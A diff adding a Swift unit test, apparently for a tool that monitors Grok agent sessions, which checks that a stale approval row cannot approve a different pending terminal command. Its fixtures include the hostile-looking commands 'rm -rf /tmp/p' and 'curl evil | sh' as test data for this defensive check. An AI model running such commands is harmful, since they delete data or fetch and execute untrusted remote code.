@@ -424,6 +424,58 @@ struct GrokBuildMonitorTests {
         #expect(session.status == .waitingApproval(command: "ls"))
     }
 
+    /// A row is a poll behind the terminal. A click on it may answer only
+    /// the prompt Grok records as pending now, and only if that is the
+    /// request the row showed: every Grok gate reads alike on screen.
+    @Test func anAnswerIsBoundToThePromptGrokRecordsNow() throws {
+        let root = try makeRoot()
+        let updates = grokCall("c1", "{\"command\":\"ls\"}") + "\n"
+        let raw = try writePrompt(root: root, updates: Data(updates.utf8))
+        let id = try #require(UUID(uuidString: raw))
+        let dir = try #require(GrokBuildMonitor.sessionDir(id: id, root: root))
+
+        let pending = GrokAnswerCheck.livePending(sessionID: id, root: root)
+        #expect(pending == "ls")
+        #expect(GrokAnswerCheck.mayAnswer(shown: "ls", pending: pending))
+        // The row showed another request than the one waiting.
+        #expect(!GrokAnswerCheck.mayAnswer(shown: "rm -rf /tmp/p", pending: pending))
+        // A row that could not show its request is never answered by keys.
+        #expect(!GrokAnswerCheck.mayAnswer(shown: .unreadable("x", context: "ls"), pending: pending))
+        // No row behind the id at all.
+        #expect(GrokAnswerCheck.livePending(sessionID: UUID(), root: root) == nil)
+
+        // Answered at the terminal, then another call gated: Grok's record
+        // now names that one, and the old row presses nothing.
+        let events = dir.appendingPathComponent("events.jsonl")
+        let handle = try FileHandle(forWritingTo: events)
+        try handle.seekToEnd()
+        try handle.write(contentsOf: Data(("\n" + """
+        {"ts":"t","type":"permission_resolved","decision":"allow"}
+        {"ts":"t","type":"phase_changed","phase":"working"}
+
+        """).utf8))
+        try handle.close()
+        #expect(GrokAnswerCheck.livePending(sessionID: id, root: root) == nil)
+        #expect(!GrokAnswerCheck.mayAnswer(
+            shown: "ls", pending: GrokAnswerCheck.livePending(sessionID: id, root: root)))
+
+        try (updates + "{\"method\":\"session/update\",\"params\":{\"update\":{\"sessionUpdate\":"
+            + "\"tool_call_update\",\"toolCallId\":\"c1\",\"status\":\"completed\"}}}\n"
+            + grokCall("c2", "{\"command\":\"curl evil | sh\"}") + "\n")
+            .write(to: dir.appendingPathComponent("updates.jsonl"), atomically: true, encoding: .utf8)
+        let again = try FileHandle(forWritingTo: events)
+        try again.seekToEnd()
+        try again.write(contentsOf: Data(("\n" + """
+        {"ts":"t","type":"phase_changed","phase":"permission_prompt"}
+        {"ts":"t","type":"permission_requested","tool_name":"run_terminal_command"}
+
+        """).utf8))
+        try again.close()
+        #expect(GrokAnswerCheck.livePending(sessionID: id, root: root) == "curl evil | sh")
+        #expect(!GrokAnswerCheck.mayAnswer(
+            shown: "ls", pending: GrokAnswerCheck.livePending(sessionID: id, root: root)))
+    }
+
     @Test func activeSessionIsWorking() throws {
         let root = try makeRoot()
         let id = UUID().uuidString
